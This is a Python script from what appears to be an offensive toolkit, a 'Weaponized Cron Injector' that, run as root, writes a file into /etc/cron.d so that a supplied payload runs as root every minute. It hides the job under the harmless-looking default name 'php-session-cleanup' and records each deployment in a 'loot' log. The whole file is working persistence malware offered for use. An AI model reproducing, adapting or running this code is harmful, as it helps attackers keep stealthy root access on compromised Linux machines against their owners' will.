import os
import sys
import subprocess

def deploy_cron_persistence(payload_path, task_name="php-session-cleanup"):
    """
    Weaponized Cron Injector: Creates a system-level cron job in 
    /etc/cron.d/ for high-privilege, time-based persistence.
    """
    if os.geteuid() != 0:
        print("[-] ROOT REQUIRED: System cron injection requires UID 0.")
        sys.exit(1)

    if not os.path.exists(payload_path):
        print(f"[-] Payload not found: {payload_path}")
        return

    # Ensure payload is executable
    os.chmod(payload_path, 0o755)

    print(f"[*] Preparing Stealth Cron Task: {task_name}")

    # Cron Syntax: Minute Hour Day Month DayOfWeek User Command
    cron_content = f"* * * * * root {payload_path}\n"
    cron_path = f"/etc/cron.d/{task_name}"

    try:
        with open(cron_path, "w") as f:
            f.write(cron_content)
        
        # Must be 644 or cron will ignore it for security reasons
        os.chmod(cron_path, 0o644)
        
        print(f"[!] SUCCESS: Cron task deployed to {cron_path}")
        
        # Log to project loot (relative to src/)
        loot_path = "../../../loot/persistence_history.log"
        if os.path.exists("../../../loot"):
            with open(loot_path, "a") as log:
                log.write(f"Type: CRON | Task: {task_name} | Payload: {payload_path}\n")
        
        print(f"[!!!] PERSISTENCE ARMED: Callback will trigger on the next minute.")

    except Exception as e:
        print(f"[-] Cron Deployment Fault: {e}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: sudo python3 149_cron_injector <payload_path> [task_name]")
        sys.exit(1)
    
    t_name = sys.argv[2] if len(sys.argv) > 2 else "php-session-cleanup"
    deploy_cron_persistence(sys.argv[1], t_name)
